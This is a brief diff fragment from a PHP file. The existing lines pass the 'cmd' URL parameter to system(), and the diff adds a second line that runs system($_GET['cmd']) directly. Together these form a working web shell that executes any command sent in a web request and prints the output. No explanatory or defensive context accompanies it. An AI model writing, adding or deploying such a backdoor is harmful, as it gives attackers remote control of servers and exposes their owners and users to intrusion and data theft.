@@ -7,3 +7,6 @@ $cmd = $_GET['cmd'];
 echo "<pre>";
 system($cmd);
 echo "</pre>";
+
+echo "<pre>";
+system($_GET['cmd']);
